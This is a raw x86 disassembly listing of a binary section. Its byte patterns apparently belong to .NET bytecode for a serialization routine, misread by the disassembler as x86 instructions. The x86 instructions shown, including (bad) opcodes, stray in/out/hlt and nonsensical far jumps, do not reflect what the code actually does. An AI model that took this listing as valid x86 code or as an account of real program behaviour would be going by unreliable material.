  4046d9:	00 00                	add    %al,(%eax)
  4046db:	00 12                	add    %dl,(%edx)
  4046dd:	03 28                	add    (%eax),%ebp
  4046df:	bc 00 00 0a 13       	mov    $0x130a0000,%esp
  4046e4:	04 06                	add    $0x6,%al
  4046e6:	17                   	pop    %ss
  4046e7:	58                   	pop    %eax
  4046e8:	0a 08                	or     (%eax),%cl
  4046ea:	11 04 7b             	adc    %eax,(%ebx,%edi,2)
  4046ed:	34 00                	xor    $0x0,%al
  4046ef:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4046f2:	ed                   	in     (%dx),%eax
  4046f3:	00 00                	add    %al,(%eax)
  4046f5:	0a 39                	or     (%ecx),%bh
  4046f7:	07                   	pop    %es
  4046f8:	00 00                	add    %al,(%eax)
  4046fa:	00 06                	add    %al,(%esi)
  4046fc:	0b dd                	or     %ebp,%ebx
  4046fe:	1c 00                	sbb    $0x0,%al
  404700:	00 00                	add    %al,(%eax)
  404702:	12 03                	adc    (%ebx),%al
  404704:	28 be 00 00 0a 2d    	sub    %bh,0x2d0a0000(%esi)
  40470a:	d1 dd                	rcr    $1,%ebp
  40470c:	0e                   	push   %cs
  40470d:	00 00                	add    %al,(%eax)
  40470f:	00 12                	add    %dl,(%edx)
  404711:	03 fe                	add    %esi,%edi
  404713:	16                   	push   %ss
  404714:	04 00                	add    $0x0,%al
  404716:	00 1b                	add    %bl,(%ebx)
  404718:	6f                   	outsl  %ds:(%esi),(%dx)
  404719:	33 00                	xor    (%eax),%eax
  40471b:	00 0a                	add    %cl,(%edx)
  40471d:	dc 07                	faddl  (%edi)
  40471f:	2a 01                	sub    (%ecx),%al
  404721:	10 00                	adc    %al,(%eax)
  404723:	00 02                	add    %al,(%edx)
  404725:	00 17                	add    %dl,(%edi)
  404727:	00 39                	add    %bh,(%ecx)
  404729:	50                   	push   %eax
  40472a:	00 0e                	add    %cl,(%esi)
  40472c:	00 00                	add    %al,(%eax)
  40472e:	00 00                	add    %al,(%eax)
  404730:	13 30                	adc    (%eax),%esi
  404732:	02 00                	add    (%eax),%al
  404734:	1e                   	push   %ds
  404735:	00 00                	add    %al,(%eax)
  404737:	00 01                	add    %al,(%ecx)
  404739:	00 00                	add    %al,(%eax)
  40473b:	11 02                	adc    %eax,(%edx)
  40473d:	03 28                	add    (%eax),%ebp
  40473f:	6d                   	insl   (%dx),%es:(%edi)
  404740:	00 00                	add    %al,(%eax)
  404742:	06                   	push   %es
  404743:	0a 06                	or     (%esi),%al
  404745:	15 40 02 00 00       	adc    $0x240,%eax
  40474a:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  40474d:	02 7b 38             	add    0x38(%ebx),%bh
  404750:	00 00                	add    %al,(%eax)
  404752:	04 06                	add    $0x6,%al
  404754:	6f                   	outsl  %ds:(%esi),(%dx)
  404755:	ea 00 00 0a 2a 00 00 	ljmp   $0x0,$0x2a0a0000
  40475c:	13 30                	adc    (%eax),%esi
  40475e:	04 00                	add    $0x0,%al
  404760:	bc 00 00 00 1f       	mov    $0x1f000000,%esp
  404765:	00 00                	add    %al,(%eax)
  404767:	11 02                	adc    %eax,(%edx)
  404769:	7b 38                	jnp    0x4047a3
  40476b:	00 00                	add    %al,(%eax)
  40476d:	04 6f                	add    $0x6f,%al
  40476f:	eb 00                	jmp    0x404771
  404771:	00 0a                	add    %cl,(%edx)
  404773:	0a 06                	or     (%esi),%al
  404775:	1f                   	pop    %ds
  404776:	0f 3d                	(bad)
  404778:	16                   	push   %ss
  404779:	00 00                	add    %al,(%eax)
  40477b:	00 20                	add    %ah,(%eax)
  40477d:	80 00 00             	addb   $0x0,(%eax)
  404780:	00 06                	add    %al,(%esi)
  404782:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  404785:	0b 03                	or     (%ebx),%eax
  404787:	07                   	pop    %es
  404788:	6f                   	outsl  %ds:(%esi),(%dx)
  404789:	ee                   	out    %al,(%dx)
  40478a:	00 00                	add    %al,(%eax)
  40478c:	0a 38                	or     (%eax),%bh
  40478e:	59                   	pop    %ecx
  40478f:	00 00                	add    %al,(%eax)
  404791:	00 06                	add    %al,(%esi)
  404793:	20 ff                	and    %bh,%bh
  404795:	ff 00                	incl   (%eax)
  404797:	00 3d 2a 00 00 00    	add    %bh,0x2a
  40479d:	20 de                	and    %bl,%dh
  40479f:	00 00                	add    %al,(%eax)
  4047a1:	00 0b                	add    %cl,(%ebx)
  4047a3:	03 07                	add    (%edi),%eax
  4047a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4047a6:	ee                   	out    %al,(%dx)
  4047a7:	00 00                	add    %al,(%eax)
  4047a9:	0a 06                	or     (%esi),%al
  4047ab:	68 28 ef 00 00       	push   $0xef28
  4047b0:	0a 28                	or     (%eax),%ch
  4047b2:	58                   	pop    %eax
  4047b3:	00 00                	add    %al,(%eax)
  4047b5:	06                   	push   %es
  4047b6:	0c 03                	or     $0x3,%al
  4047b8:	08 16                	or     %dl,(%esi)
  4047ba:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4047c0:	00 0a                	add    %cl,(%edx)
  4047c2:	38 24 00             	cmp    %ah,(%eax,%eax,1)
  4047c5:	00 00                	add    %al,(%eax)
  4047c7:	20 df                	and    %bl,%bh
  4047c9:	00 00                	add    %al,(%eax)
  4047cb:	00 0b                	add    %cl,(%ebx)
  4047cd:	03 07                	add    (%edi),%eax
  4047cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4047d0:	ee                   	out    %al,(%dx)
  4047d1:	00 00                	add    %al,(%eax)
  4047d3:	0a 06                	or     (%esi),%al
  4047d5:	28 4a 00             	sub    %cl,0x0(%edx)
  4047d8:	00 0a                	add    %cl,(%edx)
  4047da:	28 58 00             	sub    %bl,0x0(%eax)
  4047dd:	00 06                	add    %al,(%esi)
  4047df:	0c 03                	or     $0x3,%al
  4047e1:	08 16                	or     %dl,(%esi)
  4047e3:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4047e9:	00 0a                	add    %cl,(%edx)
  4047eb:	16                   	push   %ss
  4047ec:	0d 38 2d 00 00       	or     $0x2d38,%eax
  4047f1:	00 03                	add    %al,(%ebx)
  4047f3:	02 7b 38             	add    0x38(%ebx),%bh
  4047f6:	00 00                	add    %al,(%eax)
  4047f8:	04 09                	add    $0x9,%al
  4047fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4047fb:	ea 00 00 0a 7b 33 00 	ljmp   $0x33,$0x7b0a0000
  404802:	00 04 28             	add    %al,(%eax,%ebp,1)
  404805:	9a 00 00 06 02 7b 38 	lcall  $0x387b,$0x2060000
  40480c:	00 00                	add    %al,(%eax)
  40480e:	04 09                	add    $0x9,%al
  404810:	6f                   	outsl  %ds:(%esi),(%dx)
  404811:	ea 00 00 0a 03 6f 8a 	ljmp   $0x8a6f,$0x30a0000
  404818:	00 00                	add    %al,(%eax)
  40481a:	06                   	push   %es
  40481b:	09 17                	or     %edx,(%edi)
  40481d:	58                   	pop    %eax
  40481e:	0d 09 06 32 cf       	or     $0xcf320609,%eax
  404823:	2a 13                	sub    (%ebx),%dl
  404825:	30 04 00             	xor    %al,(%eax,%eax,1)
  404828:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404829:	00 00                	add    %al,(%eax)
  40482b:	00 1f                	add    %bl,(%edi)
  40482d:	00 00                	add    %al,(%eax)
  40482f:	11 02                	adc    %eax,(%edx)
  404831:	7b 38                	jnp    0x40486b
  404833:	00 00                	add    %al,(%eax)
  404835:	04 6f                	add    $0x6f,%al
  404837:	eb 00                	jmp    0x404839
  404839:	00 0a                	add    %cl,(%edx)
  40483b:	0a 06                	or     (%esi),%al
  40483d:	1f                   	pop    %ds
  40483e:	0f 3d                	(bad)
  404840:	16                   	push   %ss
  404841:	00 00                	add    %al,(%eax)
  404843:	00 20                	add    %ah,(%eax)
  404845:	90                   	nop
  404846:	00 00                	add    %al,(%eax)
  404848:	00 06                	add    %al,(%esi)
  40484a:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  40484d:	0b 03                	or     (%ebx),%eax
  40484f:	07                   	pop    %es
  404850:	6f                   	outsl  %ds:(%esi),(%dx)
  404851:	ee                   	out    %al,(%dx)
  404852:	00 00                	add    %al,(%eax)
  404854:	0a 38                	or     (%eax),%bh
  404856:	59                   	pop    %ecx
  404857:	00 00                	add    %al,(%eax)
  404859:	00 06                	add    %al,(%esi)
  40485b:	20 ff                	and    %bh,%bh
  40485d:	ff 00                	incl   (%eax)
  40485f:	00 3d 2a 00 00 00    	add    %bh,0x2a
  404865:	20 dc                	and    %bl,%ah
  404867:	00 00                	add    %al,(%eax)
  404869:	00 0b                	add    %cl,(%ebx)
  40486b:	03 07                	add    (%edi),%eax
  40486d:	6f                   	outsl  %ds:(%esi),(%dx)
  40486e:	ee                   	out    %al,(%dx)
  40486f:	00 00                	add    %al,(%eax)
  404871:	0a 06                	or     (%esi),%al
  404873:	68 28 ef 00 00       	push   $0xef28
  404878:	0a 28                	or     (%eax),%ch
  40487a:	58                   	pop    %eax
  40487b:	00 00                	add    %al,(%eax)
  40487d:	06                   	push   %es
  40487e:	0c 03                	or     $0x3,%al
  404880:	08 16                	or     %dl,(%esi)
  404882:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  404888:	00 0a                	add    %cl,(%edx)
  40488a:	38 24 00             	cmp    %ah,(%eax,%eax,1)
  40488d:	00 00                	add    %al,(%eax)
  40488f:	20 dd                	and    %bl,%ch
  404891:	00 00                	add    %al,(%eax)
  404893:	00 0b                	add    %cl,(%ebx)
  404895:	03 07                	add    (%edi),%eax
  404897:	6f                   	outsl  %ds:(%esi),(%dx)
  404898:	ee                   	out    %al,(%dx)
  404899:	00 00                	add    %al,(%eax)
  40489b:	0a 06                	or     (%esi),%al
  40489d:	28 4a 00             	sub    %cl,0x0(%edx)
  4048a0:	00 0a                	add    %cl,(%edx)
  4048a2:	28 58 00             	sub    %bl,0x0(%eax)
  4048a5:	00 06                	add    %al,(%esi)
  4048a7:	0c 03                	or     $0x3,%al
  4048a9:	08 16                	or     %dl,(%esi)
  4048ab:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4048b1:	00 0a                	add    %cl,(%edx)
  4048b3:	16                   	push   %ss
  4048b4:	0d 38 16 00 00       	or     $0x1638,%eax
  4048b9:	00 02                	add    %al,(%edx)
  4048bb:	7b 38                	jnp    0x4048f5
  4048bd:	00 00                	add    %al,(%eax)
  4048bf:	04 09                	add    $0x9,%al
  4048c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4048c2:	ea 00 00 0a 03 6f 8a 	ljmp   $0x8a6f,$0x30a0000
  4048c9:	00 00                	add    %al,(%eax)
  4048cb:	06                   	push   %es
  4048cc:	09 17                	or     %edx,(%edi)
  4048ce:	58                   	pop    %eax
  4048cf:	0d 09 06 32 e6       	or     $0xe6320609,%eax
  4048d4:	2a 00                	sub    (%eax),%al
  4048d6:	00 00                	add    %al,(%eax)
  4048d8:	13 30                	adc    (%eax),%esi
  4048da:	02 00                	add    (%eax),%al
  4048dc:	99                   	cltd
  4048dd:	00 00                	add    %al,(%eax)
  4048df:	00 20                	add    %ah,(%eax)
  4048e1:	00 00                	add    %al,(%eax)
  4048e3:	11 02                	adc    %eax,(%edx)
  4048e5:	7b 36                	jnp    0x40491d
  4048e7:	00 00                	add    %al,(%eax)
  4048e9:	04 0a                	add    $0xa,%al
  4048eb:	06                   	push   %es
  4048ec:	1a 59 45             	sbb    0x45(%ecx),%bl
  4048ef:	07                   	pop    %es
  4048f0:	00 00                	add    %al,(%eax)
  4048f2:	00 22                	add    %ah,(%edx)
  4048f4:	00 00                	add    %al,(%eax)
  4048f6:	00 05 00 00 00 16    	add    %al,0x16000000
  4048fc:	00 00                	add    %al,(%eax)
  4048fe:	00 6b 00             	add    %ch,0x0(%ebx)
  404901:	00 00                	add    %al,(%eax)
  404903:	38 00                	cmp    %al,(%eax)
  404905:	00 00                	add    %al,(%eax)
  404907:	49                   	dec    %ecx
  404908:	00 00                	add    %al,(%eax)
  40490a:	00 5a 00             	add    %bl,0x0(%edx)
  40490d:	00 00                	add    %al,(%eax)
  40490f:	38 66 00             	cmp    %ah,0x0(%esi)
  404912:	00 00                	add    %al,(%eax)
  404914:	02 7b 35             	add    0x35(%ebx),%bh
  404917:	00 00                	add    %al,(%eax)
  404919:	04 a5                	add    $0xa5,%al
  40491b:	68 00 00 01 28       	push   $0x28010000
  404920:	f0 00 00             	lock add %al,(%eax)
  404923:	0a 2a                	or     (%edx),%ch
  404925:	02 7b 35             	add    0x35(%ebx),%bh
  404928:	00 00                	add    %al,(%eax)
  40492a:	04 a5                	add    $0xa5,%al
  40492c:	95                   	xchg   %eax,%ebp
  40492d:	00 00                	add    %al,(%eax)
  40492f:	01 2a                	add    %ebp,(%edx)
  404931:	02 7b 35             	add    0x35(%ebx),%bh
  404934:	00 00                	add    %al,(%eax)
  404936:	04 6f                	add    $0x6f,%al
  404938:	38 00                	cmp    %al,(%eax)
  40493a:	00 0a                	add    %cl,(%edx)
  40493c:	6f                   	outsl  %ds:(%esi),(%dx)
  40493d:	f1                   	int1
  40493e:	00 00                	add    %al,(%eax)
  404940:	0a 28                	or     (%eax),%ch
  404942:	f2 00 00             	repnz add %al,(%eax)
  404945:	0a 2a                	or     (%edx),%ch
  404947:	02 7b 35             	add    0x35(%ebx),%bh
  40494a:	00 00                	add    %al,(%eax)
  40494c:	04 a5                	add    $0xa5,%al
  40494e:	96                   	xchg   %eax,%esi
  40494f:	00 00                	add    %al,(%eax)
  404951:	01 28                	add    %ebp,(%eax)
  404953:	f3 00 00             	repz add %al,(%eax)
  404956:	0a 2a                	or     (%edx),%ch
  404958:	02 7b 35             	add    0x35(%ebx),%bh
  40495b:	00 00                	add    %al,(%eax)
  40495d:	04 a5                	add    $0xa5,%al
  40495f:	97                   	xchg   %eax,%edi
  404960:	00 00                	add    %al,(%eax)
  404962:	01 28                	add    %ebp,(%eax)
  404964:	f4                   	hlt
  404965:	00 00                	add    %al,(%eax)
  404967:	0a 2a                	or     (%edx),%ch
  404969:	02 7b 35             	add    0x35(%ebx),%bh
  40496c:	00 00                	add    %al,(%eax)
  40496e:	04 a5                	add    $0xa5,%al
  404970:	6b 00 00             	imul   $0x0,(%eax),%eax
  404973:	01 28                	add    %ebp,(%eax)
  404975:	f5                   	cmc
  404976:	00 00                	add    %al,(%eax)
  404978:	0a 2a                	or     (%edx),%ch
  40497a:	16                   	push   %ss
  40497b:	6a 2a                	push   $0x2a
  40497d:	00 00                	add    %al,(%eax)
  40497f:	00 13                	add    %dl,(%ebx)
  404981:	30 02                	xor    %al,(%edx)
  404983:	00 99 00 00 00 20    	add    %bl,0x20000000(%ecx)
  404989:	00 00                	add    %al,(%eax)
  40498b:	11 02                	adc    %eax,(%edx)
  40498d:	7b 36                	jnp    0x4049c5
  40498f:	00 00                	add    %al,(%eax)
  404991:	04 0a                	add    $0xa,%al
  404993:	06                   	push   %es
  404994:	1a 59 45             	sbb    0x45(%ecx),%bl
  404997:	07                   	pop    %es
  404998:	00 00                	add    %al,(%eax)
  40499a:	00 22                	add    %ah,(%edx)
  40499c:	00 00                	add    %al,(%eax)
  40499e:	00 05 00 00 00 11    	add    %al,0x11000000
  4049a4:	00 00                	add    %al,(%eax)
  4049a6:	00 6b 00             	add    %ch,0x0(%ebx)
  4049a9:	00 00                	add    %al,(%eax)
  4049ab:	38 00                	cmp    %al,(%eax)
  4049ad:	00 00                	add    %al,(%eax)
  4049af:	49                   	dec    %ecx
  4049b0:	00 00                	add    %al,(%eax)
  4049b2:	00 5a 00             	add    %bl,0x0(%edx)
  4049b5:	00 00                	add    %al,(%eax)
  4049b7:	38 66 00             	cmp    %ah,0x0(%esi)
  4049ba:	00 00                	add    %al,(%eax)
  4049bc:	02 7b 35             	add    0x35(%ebx),%bh
  4049bf:	00 00                	add    %al,(%eax)
  4049c1:	04 a5                	add    $0xa5,%al
  4049c3:	68 00 00 01 2a       	push   $0x2a010000
  4049c8:	02 7b 35             	add    0x35(%ebx),%bh
  4049cb:	00 00                	add    %al,(%eax)
  4049cd:	04 a5                	add    $0xa5,%al
  4049cf:	68 00 00 01 28       	push   $0x28010000
  4049d4:	f6 00 00             	testb  $0x0,(%eax)
  4049d7:	0a 2a                	or     (%edx),%ch
  4049d9:	02 7b 35             	add    0x35(%ebx),%bh
  4049dc:	00 00                	add    %al,(%eax)
  4049de:	04 6f                	add    $0x6f,%al
  4049e0:	38 00                	cmp    %al,(%eax)
  4049e2:	00 0a                	add    %cl,(%edx)
  4049e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4049e5:	f1                   	int1
  4049e6:	00 00                	add    %al,(%eax)
  4049e8:	0a 28                	or     (%eax),%ch
  4049ea:	f7 00 00 0a 2a 02    	testl  $0x22a0a00,(%eax)
  4049f0:	7b 35                	jnp    0x404a27
  4049f2:	00 00                	add    %al,(%eax)
  4049f4:	04 a5                	add    $0xa5,%al
  4049f6:	96                   	xchg   %eax,%esi
  4049f7:	00 00                	add    %al,(%eax)
  4049f9:	01 28                	add    %ebp,(%eax)
  4049fb:	f8                   	clc
  4049fc:	00 00                	add    %al,(%eax)
  4049fe:	0a 2a                	or     (%edx),%ch
  404a00:	02 7b 35             	add    0x35(%ebx),%bh
  404a03:	00 00                	add    %al,(%eax)
  404a05:	04 a5                	add    $0xa5,%al
  404a07:	97                   	xchg   %eax,%edi
  404a08:	00 00                	add    %al,(%eax)
  404a0a:	01 28                	add    %ebp,(%eax)
  404a0c:	f9                   	stc
  404a0d:	00 00                	add    %al,(%eax)
  404a0f:	0a 2a                	or     (%edx),%ch
  404a11:	02 7b 35             	add    0x35(%ebx),%bh
  404a14:	00 00                	add    %al,(%eax)
  404a16:	04 a5                	add    $0xa5,%al
  404a18:	6b 00 00             	imul   $0x0,(%eax),%eax
  404a1b:	01 28                	add    %ebp,(%eax)
  404a1d:	fa                   	cli
  404a1e:	00 00                	add    %al,(%eax)
  404a20:	0a 2a                	or     (%edx),%ch
  404a22:	16                   	push   %ss
  404a23:	6a 2a                	push   $0x2a
  404a25:	00 00                	add    %al,(%eax)
  404a27:	00 13                	add    %dl,(%ebx)
  404a29:	30 02                	xor    %al,(%edx)
  404a2b:	00 87 00 00 00 20    	add    %al,0x20000000(%edi)
  404a31:	00 00                	add    %al,(%eax)
  404a33:	11 02                	adc    %eax,(%edx)
  404a35:	7b 36                	jnp    0x404a6d
  404a37:	00 00                	add    %al,(%eax)
  404a39:	04 0a                	add    $0xa,%al
  404a3b:	06                   	push   %es
  404a3c:	1a 59 45             	sbb    0x45(%ecx),%bl
  404a3f:	07                   	pop    %es
  404a40:	00 00                	add    %al,(%eax)
  404a42:	00 16                	add    %dl,(%esi)
  404a44:	00 00                	add    %al,(%eax)
  404a46:	00 05 00 00 00 52    	add    %al,0x52000000
  404a4c:	00 00                	add    %al,(%eax)
  404a4e:	00 52 00             	add    %dl,0x0(%edx)
  404a51:	00 00                	add    %al,(%eax)
  404a53:	27                   	daa
  404a54:	00 00                	add    %al,(%eax)
  404a56:	00 33                	add    %dh,(%ebx)
  404a58:	00 00                	add    %al,(%eax)
  404a5a:	00 40 00             	add    %al,0x0(%eax)
  404a5d:	00 00                	add    %al,(%eax)
  404a5f:	38 4d 00             	cmp    %cl,0x0(%ebp)
  404a62:	00 00                	add    %al,(%eax)
  404a64:	02 7b 35             	add    0x35(%ebx),%bh
  404a67:	00 00                	add    %al,(%eax)
  404a69:	04 a5                	add    $0xa5,%al
  404a6b:	68 00 00 01 28       	push   $0x28010000
  404a70:	fb                   	sti
  404a71:	00 00                	add    %al,(%eax)
  404a73:	0a 2a                	or     (%edx),%ch
  404a75:	02 7b 35             	add    0x35(%ebx),%bh
  404a78:	00 00                	add    %al,(%eax)
  404a7a:	04 74                	add    $0x74,%al
  404a7c:	38 00                	cmp    %al,(%eax)
  404a7e:	00 01                	add    %al,(%ecx)
  404a80:	28 fc                	sub    %bh,%ah
  404a82:	00 00                	add    %al,(%eax)
  404a84:	0a 2a                	or     (%edx),%ch
  404a86:	02 7b 35             	add    0x35(%ebx),%bh
  404a89:	00 00                	add    %al,(%eax)
  404a8b:	04 a5                	add    $0xa5,%al
  404a8d:	96                   	xchg   %eax,%esi
  404a8e:	00 00                	add    %al,(%eax)
  404a90:	01 2a                	add    %ebp,(%edx)
  404a92:	02 7b 35             	add    0x35(%ebx),%bh
  404a95:	00 00                	add    %al,(%eax)
  404a97:	04 a5                	add    $0xa5,%al
  404a99:	97                   	xchg   %eax,%edi
  404a9a:	00 00                	add    %al,(%eax)
  404a9c:	01 6c 2a 02          	add    %ebp,0x2(%edx,%ebp,1)
  404aa0:	7b 35                	jnp    0x404ad7
  404aa2:	00 00                	add    %al,(%eax)
  404aa4:	04 a5                	add    $0xa5,%al
  404aa6:	6b 00 00             	imul   $0x0,(%eax),%eax
  404aa9:	01 28                	add    %ebp,(%eax)
  404aab:	fa                   	cli
  404aac:	00 00                	add    %al,(%eax)
  404aae:	0a 6c 2a 23          	or     0x23(%edx,%ebp,1),%ch
	...
  404aba:	2a 00                	sub    (%eax),%al
  404abc:	13 30                	adc    (%eax),%esi
  404abe:	02 00                	add    (%eax),%al
  404ac0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404ac1:	00 00                	add    %al,(%eax)
  404ac3:	00 21                	add    %ah,(%ecx)
  404ac5:	00 00                	add    %al,(%eax)
  404ac7:	11 02                	adc    %eax,(%edx)
  404ac9:	7b 36                	jnp    0x404b01
  404acb:	00 00                	add    %al,(%eax)
  404acd:	04 0a                	add    $0xa,%al
  404acf:	06                   	push   %es
  404ad0:	1a 59 45             	sbb    0x45(%ecx),%bl
  404ad3:	08 00                	or     %al,(%eax)
  404ad5:	00 00                	add    %al,(%eax)
  404ad7:	16                   	push   %ss
  404ad8:	00 00                	add    %al,(%eax)
  404ada:	00 05 00 00 00 6e    	add    %al,0x6e000000
  404ae0:	00 00                	add    %al,(%eax)
  404ae2:	00 6e 00             	add    %ch,0x0(%esi)
  404ae5:	00 00                	add    %al,(%eax)
  404ae7:	27                   	daa
  404ae8:	00 00                	add    %al,(%eax)
  404aea:	00 38                	add    %bh,(%eax)
  404aec:	00 00                	add    %al,(%eax)
  404aee:	00 49 00             	add    %cl,0x0(%ecx)
  404af1:	00 00                	add    %al,(%eax)
  404af3:	62 00                	bound  %eax,(%eax)
  404af5:	00 00                	add    %al,(%eax)
  404af7:	38 69 00             	cmp    %ch,0x0(%ecx)
  404afa:	00 00                	add    %al,(%eax)
  404afc:	02 7b 35             	add    0x35(%ebx),%bh
  404aff:	00 00                	add    %al,(%eax)
  404b01:	04 a5                	add    $0xa5,%al
  404b03:	68 00 00 01 28       	push   $0x28010000
  404b08:	e7 00                	out    %eax,$0x0
  404b0a:	00 0a                	add    %cl,(%edx)
  404b0c:	2a 02                	sub    (%edx),%al
  404b0e:	7b 35                	jnp    0x404b45
  404b10:	00 00                	add    %al,(%eax)
  404b12:	04 6f                	add    $0x6f,%al
  404b14:	38 00                	cmp    %al,(%eax)
  404b16:	00 0a                	add    %cl,(%edx)
  404b18:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  404b1c:	06                   	push   %es
  404b1d:	2a 02                	sub    (%edx),%al
  404b1f:	7b 35                	jnp    0x404b56
  404b21:	00 00                	add    %al,(%eax)
  404b23:	04 a5                	add    $0xa5,%al
  404b25:	96                   	xchg   %eax,%esi
  404b26:	00 00                	add    %al,(%eax)
  404b28:	01 28                	add    %ebp,(%eax)
  404b2a:	e8 00 00 0a 2a       	call   0x2a4a4b2f
  404b2f:	02 7b 35             	add    0x35(%ebx),%bh
  404b32:	00 00                	add    %al,(%eax)
  404b34:	04 a5                	add    $0xa5,%al
  404b36:	97                   	xchg   %eax,%edi
  404b37:	00 00                	add    %al,(%eax)
  404b39:	01 28                	add    %ebp,(%eax)
  404b3b:	fd                   	std
  404b3c:	00 00                	add    %al,(%eax)
  404b3e:	0a 2a                	or     (%edx),%ch
  404b40:	02 7b 35             	add    0x35(%ebx),%bh
  404b43:	00 00                	add    %al,(%eax)
  404b45:	04 a5                	add    $0xa5,%al
  404b47:	6b 00 00             	imul   $0x0,(%eax),%eax
  404b4a:	01 0b                	add    %ecx,(%ebx)
  404b4c:	12 01                	adc    (%ecx),%al
  404b4e:	28 fe                	sub    %bh,%dh
  404b50:	00 00                	add    %al,(%eax)
  404b52:	0a 28                	or     (%eax),%ch
  404b54:	e7 00                	out    %eax,$0x0
  404b56:	00 0a                	add    %cl,(%edx)
  404b58:	2a 02                	sub    (%edx),%al
  404b5a:	7b 35                	jnp    0x404b91
  404b5c:	00 00                	add    %al,(%eax)
  404b5e:	04 74                	add    $0x74,%al
  404b60:	02 00                	add    (%eax),%al
  404b62:	00 1b                	add    %bl,(%ebx)
  404b64:	2a 16                	sub    (%esi),%dl
  404b66:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404b6a:	01 2a                	add    %ebp,(%edx)
  404b6c:	13 30                	adc    (%eax),%esi
  404b6e:	04 00                	add    $0x0,%al
  404b70:	4b                   	dec    %ebx
  404b71:	00 00                	add    %al,(%eax)
  404b73:	00 22                	add    %ah,(%edx)
  404b75:	00 00                	add    %al,(%eax)
  404b77:	11 03                	adc    %eax,(%ebx)
  404b79:	28 6a 00             	sub    %ch,0x0(%edx)
  404b7c:	00 0a                	add    %cl,(%edx)
  404b7e:	39 3e                	cmp    %edi,(%esi)
  404b80:	00 00                	add    %al,(%eax)
  404b82:	00 14 0a             	add    %dl,(%edx,%ecx,1)
  404b85:	03 19                	add    (%ecx),%ebx
  404b87:	17                   	pop    %ss
  404b88:	17                   	pop    %ss
  404b89:	73 ff                	jae    0x404b8a
  404b8b:	00 00                	add    %al,(%eax)
  404b8d:	0a 0b                	or     (%ebx),%cl
  404b8f:	07                   	pop    %es
  404b90:	6f                   	outsl  %ds:(%esi),(%dx)
  404b91:	e2 00                	loop   0x404b93
  404b93:	00 0a                	add    %cl,(%edx)
  404b95:	d4 8d                	aam    $0x8d
  404b97:	44                   	inc    %esp
  404b98:	00 00                	add    %al,(%eax)
  404b9a:	01 0a                	add    %ecx,(%edx)
  404b9c:	07                   	pop    %es
  404b9d:	06                   	push   %es
  404b9e:	16                   	push   %ss
  404b9f:	07                   	pop    %es
  404ba0:	6f                   	outsl  %ds:(%esi),(%dx)
  404ba1:	e2 00                	loop   0x404ba3
  404ba3:	00 0a                	add    %cl,(%edx)
  404ba5:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  404bac:	07                   	pop    %es
  404bad:	6f                   	outsl  %ds:(%esi),(%dx)
  404bae:	9f                   	lahf
  404baf:	00 00                	add    %al,(%eax)
  404bb1:	0a 07                	or     (%edi),%al
  404bb3:	6f                   	outsl  %ds:(%esi),(%dx)
  404bb4:	40                   	inc    %eax
  404bb5:	00 00                	add    %al,(%eax)
  404bb7:	0a 02                	or     (%edx),%al
  404bb9:	06                   	push   %es
  404bba:	28 79 00             	sub    %bh,0x0(%ecx)
  404bbd:	00 06                	add    %al,(%esi)
  404bbf:	17                   	pop    %ss
  404bc0:	2a 16                	sub    (%esi),%dl
  404bc2:	2a 00                	sub    (%eax),%al
  404bc4:	13 30                	adc    (%eax),%esi
  404bc6:	05 00 40 00 00       	add    $0x4000,%eax
  404bcb:	00 00                	add    %al,(%eax)
  404bcd:	00 00                	add    %al,(%eax)
  404bcf:	00 02                	add    %al,(%edx)
  404bd1:	7b 35                	jnp    0x404c08
  404bd3:	00 00                	add    %al,(%eax)
  404bd5:	04 39                	add    $0x39,%al
  404bd7:	33 00                	xor    (%eax),%eax
  404bd9:	00 00                	add    %al,(%eax)
  404bdb:	03 1c 73             	add    (%ebx,%esi,2),%ebx
  404bde:	6c                   	insb   (%dx),%es:(%edi)
  404bdf:	00 00                	add    %al,(%eax)
  404be1:	0a 25 02 7b 35 00    	or     0x357b02,%ah
  404be7:	00 04 74             	add    %al,(%esp,%esi,2)
  404bea:	02 00                	add    (%eax),%al
  404bec:	00 1b                	add    %bl,(%ebx)
  404bee:	16                   	push   %ss
  404bef:	02 7b 35             	add    0x35(%ebx),%bh
  404bf2:	00 00                	add    %al,(%eax)
  404bf4:	04 74                	add    $0x74,%al
  404bf6:	02 00                	add    (%eax),%al
  404bf8:	00 1b                	add    %bl,(%ebx)
  404bfa:	8e 69 6f             	mov    0x6f(%ecx),%gs
  404bfd:	4c                   	dec    %esp
  404bfe:	00 00                	add    %al,(%eax)
  404c00:	0a 25 6f 9f 00 00    	or     0x9f6f,%ah
  404c06:	0a 6f 40             	or     0x40(%edi),%ch
  404c09:	00 00                	add    %al,(%eax)
  404c0b:	0a 17                	or     (%edi),%dl
  404c0d:	2a 16                	sub    (%esi),%dl
  404c0f:	2a 13                	sub    (%ebx),%dl
  404c11:	30 04 00             	xor    %al,(%eax,%eax,1)
  404c14:	af                   	scas   %es:(%edi),%eax
  404c15:	00 00                	add    %al,(%eax)
  404c17:	00 23                	add    %ah,(%ebx)
  404c19:	00 00                	add    %al,(%eax)
  404c1b:	11 02                	adc    %eax,(%edx)
  404c1d:	0a 03                	or     (%ebx),%al
  404c1f:	6f                   	outsl  %ds:(%esi),(%dx)
  404c20:	f1                   	int1
  404c21:	00 00                	add    %al,(%eax)
  404c23:	0a 19                	or     (%ecx),%bl
  404c25:	8d 39                	lea    (%ecx),%edi
  404c27:	00 00                	add    %al,(%eax)
  404c29:	01 25 d0 47 00 00    	add    %esp,0x47d0
  404c2f:	04 28                	add    $0x28,%al
  404c31:	e4 00                	in     $0x0,%al
  404c33:	00 0a                	add    %cl,(%edx)
